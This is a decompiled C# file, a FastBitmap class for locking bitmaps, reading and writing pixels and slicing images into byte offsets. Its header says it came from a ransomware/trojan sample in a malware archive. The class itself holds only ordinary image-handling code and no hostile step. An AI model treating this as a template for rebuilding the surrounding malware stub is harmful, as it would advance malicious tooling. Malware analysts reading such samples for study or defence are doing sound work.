// Decompiled with JetBrains decompiler
// Type: VanillaStub.Helpers.Services.StreamLibrary.src.FastBitmap
// Assembly: VanillaStub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EA90E0E3-D3F0-4587-A40F-47A7FA59CCA7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b3851e5c28e260637f2bb0d27bd956234053f958c19d044c30c87ff4b731caac.exe

using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;

namespace VanillaStub.Helpers.Services.StreamLibrary.src
{
  public class FastBitmap
  {
    public DateTime BitmapCreatedAt;

    public FastBitmap(Bitmap bitmap, PixelFormat format)
    {
      switch (format)
      {
        case PixelFormat.Format24bppRgb:
        case PixelFormat.Format32bppRgb:
        case PixelFormat.Format1bppIndexed:
        case PixelFormat.Format4bppIndexed:
        case PixelFormat.Format8bppIndexed:
        case PixelFormat.Format32bppArgb:
          this.bitmap = bitmap;
          this.Width = this.bitmap.Width;
          this.Height = this.bitmap.Height;
          this.format = format;
          this.Lock();
          this.BitmapCreatedAt = DateTime.Now;
          break;
        default:
          throw new NotSupportedException(format.ToString() + " is not supported.");
      }
    }

    public FastBitmap(Bitmap bitmap)
    {
      this.format = bitmap.PixelFormat;
      switch (this.format)
      {
        case PixelFormat.Format24bppRgb:
        case PixelFormat.Format32bppRgb:
        case PixelFormat.Format1bppIndexed:
        case PixelFormat.Format4bppIndexed:
        case PixelFormat.Format8bppIndexed:
        case PixelFormat.Format32bppArgb:
          this.bitmap = bitmap;
          this.Width = this.bitmap.Width;
          this.Height = this.bitmap.Height;
          this.format = this.format;
          this.Lock();
          this.BitmapCreatedAt = DateTime.Now;
          break;
        default:
          throw new NotSupportedException(this.format.ToString() + " is not supported.");
      }
    }

    public Bitmap bitmap { get; set; }

    public BitmapData bitmapData { get; private set; }

    public int Width { get; }

    public int Height { get; }

    public PixelFormat format { get; }

    public bool IsLocked { get; private set; }

    public int Stride => this.bitmapData.Stride;

    public unsafe Color GetPixel(int x, int y)
    {
      byte* numPtr = (byte*) ((IntPtr) this.bitmapData.Scan0.ToPointer() + (IntPtr) this.CalcOffset(x, y));
      return Color.FromArgb((int) numPtr[3], (int) numPtr[2], (int) numPtr[1], (int) *numPtr);
    }

    public unsafe void SetPixel(int x, int y, Color color)
    {
      byte* numPtr = (byte*) ((IntPtr) this.bitmapData.Scan0.ToPointer() + (IntPtr) this.CalcOffset(x, y));
      numPtr[3] = color.A;
      numPtr[2] = color.R;
      numPtr[1] = color.G;
      *numPtr = color.B;
    }

    public Color GetPixel(int x, int y, byte[] ImgData)
    {
      long index = this.CalcOffset(x, y) + 4L;
      return index + 4L < (long) ImgData.Length ? Color.FromArgb((int) byte.MaxValue, (int) ImgData[index], (int) ImgData[index + 1L], (int) ImgData[index + 2L]) : Color.FromArgb((int) byte.MaxValue, 0, 0, 0);
    }

    public void SetPixel(int x, int y, Color color, byte[] ImgData)
    {
      long index = this.CalcOffset(x, y) + 4L;
      if (index + 4L >= (long) ImgData.Length)
        return;
      ImgData[index] = color.R;
      ImgData[index + 1L] = color.G;
      ImgData[index + 2L] = color.B;
      this.ByteArrayToBitmap(ImgData);
    }

    public void DrawRectangle(Point begin, Point end, Color color)
    {
      for (int x = begin.X; x < end.X; ++x)
      {
        for (int y = begin.Y; y < end.Y; ++y)
          this.SetPixel(x, y, color);
      }
    }

    public long CalcOffset(int x, int y)
    {
      switch (this.format)
      {
        case PixelFormat.Format24bppRgb:
        case PixelFormat.Format32bppRgb:
          return (long) (y * this.bitmapData.Stride + x * 3);
        case PixelFormat.Format1bppIndexed:
          return (long) (y * this.bitmapData.Stride + x * 8);
        case PixelFormat.Format4bppIndexed:
          return (long) (y * this.bitmapData.Stride + x / 2);
        case PixelFormat.Format8bppIndexed:
          return (long) (y * this.bitmapData.Stride + x);
        case PixelFormat.Format32bppArgb:
          return (long) (y * this.bitmapData.Stride + x * 4);
        default:
          return 0;
      }
    }

    public static int CalcImageOffset(int x, int y, PixelFormat format, int width)
    {
      switch (format)
      {
        case PixelFormat.Format24bppRgb:
        case PixelFormat.Format32bppRgb:
          return y * width * 3 + x * 3;
        case PixelFormat.Format1bppIndexed:
          return y * width * 8 + x * 8;
        case PixelFormat.Format4bppIndexed:
          return y * (width / 2) + x / 2;
        case PixelFormat.Format8bppIndexed:
          return y * width + x;
        case PixelFormat.Format32bppArgb:
          return y * width * 4 + x * 4;
        default:
          throw new NotSupportedException(format.ToString() + " is not supported.");
      }
    }

    public void ScanPixelDuplicates(Point BeginPoint, ref Point EndPoint, ref Color RetColor)
    {
      Color pixel1 = this.GetPixel(BeginPoint.X, BeginPoint.Y);
      for (int x = BeginPoint.X; x < this.Width; ++x)
      {
        Color pixel2 = this.GetPixel(x, BeginPoint.Y);
        if ((int) pixel1.R != (int) pixel2.R || (int) pixel1.G != (int) pixel2.G || (int) pixel1.B != (int) pixel2.B)
        {
          EndPoint = new Point(x, BeginPoint.Y);
          RetColor = pixel1;
          return;
        }
      }
      EndPoint = new Point(this.Width, BeginPoint.Y);
      RetColor = pixel1;
    }

    public void Unlock()
    {
      if (!this.IsLocked)
        return;
      this.bitmap.UnlockBits(this.bitmapData);
      this.IsLocked = false;
    }

    public void Lock()
    {
      if (this.IsLocked)
        return;
      this.bitmapData = this.bitmap.LockBits(new Rectangle(0, 0, this.Width, this.Height), ImageLockMode.ReadWrite, this.format);
      this.IsLocked = true;
    }

    public byte[] ToByteArray()
    {
      int length = Math.Abs(this.bitmapData.Stride) * this.Height;
      byte[] destination = new byte[length];
      Marshal.Copy(new IntPtr(this.bitmapData.Scan0.ToInt32()), destination, 0, length);
      return destination;
    }

    public void ByteArrayToBitmap(byte[] data) => Marshal.Copy(data, 0, this.bitmapData.Scan0, data.Length);

    public void Dispose()
    {
      if (this.bitmap == null)
        return;
      try
      {
        this.bitmap.UnlockBits(this.bitmapData);
      }
      catch
      {
      }
      try
      {
        this.bitmap.Dispose();
      }
      catch
      {
      }
      try
      {
        this.bitmap = (Bitmap) null;
        this.bitmapData = (BitmapData) null;
      }
      catch
      {
      }
    }

    public static ArrayOffset[] GetBytePoints(
      Point beginPoint,
      Point endPoint,
      Size ImgSize,
      PixelFormat format)
    {
      List<ArrayOffset> arrayOffsetList = new List<ArrayOffset>();
      for (int y = beginPoint.Y; y < endPoint.Y; ++y)
      {
        int begin = FastBitmap.CalcImageOffset(beginPoint.X, y, format, ImgSize.Width);
        int end = FastBitmap.CalcImageOffset(endPoint.X, y, format, ImgSize.Width);
        switch (format)
        {
          case PixelFormat.Format24bppRgb:
          case PixelFormat.Format32bppRgb:
            if (end + (endPoint.X - beginPoint.X) * 3 < ImgSize.Width * ImgSize.Height * 3)
            {
              arrayOffsetList.Add(new ArrayOffset(begin, end, (endPoint.X - beginPoint.X) * 3, beginPoint.X, y, endPoint.X - beginPoint.X, 1));
              break;
            }
            break;
          case PixelFormat.Format1bppIndexed:
            if (end + (endPoint.X - beginPoint.X) * 8 < ImgSize.Width * ImgSize.Height * 8)
            {
              arrayOffsetList.Add(new ArrayOffset(begin, end, (endPoint.X - beginPoint.X) * 8, beginPoint.X, y, endPoint.X - beginPoint.X, 1));
              break;
            }
            break;
          case PixelFormat.Format4bppIndexed:
            if (end + (endPoint.X - beginPoint.X) / 2 < ImgSize.Width * ImgSize.Height / 2)
            {
              arrayOffsetList.Add(new ArrayOffset(begin, end, (endPoint.X - beginPoint.X) / 2, beginPoint.X, y, endPoint.X - beginPoint.X, 1));
              break;
            }
            break;
          case PixelFormat.Format8bppIndexed:
            if (end + (endPoint.X - beginPoint.X) < ImgSize.Width * ImgSize.Height)
            {
              arrayOffsetList.Add(new ArrayOffset(begin, end, endPoint.X - beginPoint.X, beginPoint.X, y, endPoint.X - beginPoint.X, 1));
              break;
            }
            break;
          case PixelFormat.Format32bppArgb:
            if (end + (endPoint.X - beginPoint.X) * 4 < ImgSize.Width * ImgSize.Height * 4)
            {
              arrayOffsetList.Add(new ArrayOffset(begin, end, (endPoint.X - beginPoint.X) * 4, beginPoint.X, y, endPoint.X - beginPoint.X, 1));
              break;
            }
            break;
          default:
            throw new NotSupportedException(format.ToString() + " is not supported.");
        }
      }
      return arrayOffsetList.ToArray();
    }

    public static ArrayOffset[,][] Get2DBytePoints(
      Point beginPoint,
      Point endPoint,
      Size ImgSize,
      int SlicePieces,
      PixelFormat format)
    {
      int num1 = endPoint.X - beginPoint.X;
      int num2 = endPoint.Y - beginPoint.Y;
      float length1 = (float) num1 / (float) SlicePieces;
      float length2 = (float) num2 / (float) SlicePieces;
      if ((double) length1 - (double) (int) length1 > 0.0)
        ++length1;
      if ((double) length2 - (double) (int) length2 > 0.0)
        ++length2;
      ArrayOffset[,][] arrayOffsetArray = new ArrayOffset[(int) length2, (int) length1][];
      Point point = new Point(0, 0);
      for (int y = beginPoint.Y; y < num2; y += SlicePieces)
      {
        for (int x = beginPoint.X; x < num1; x += SlicePieces)
        {
          arrayOffsetArray[point.Y, point.X] = FastBitmap.GetBytePoints(new Point(x, y), new Point(x + SlicePieces, y + SlicePieces), ImgSize, format);
          ++point.X;
        }
        point.X = 0;
        ++point.Y;
      }
      return arrayOffsetArray;
    }
  }
}
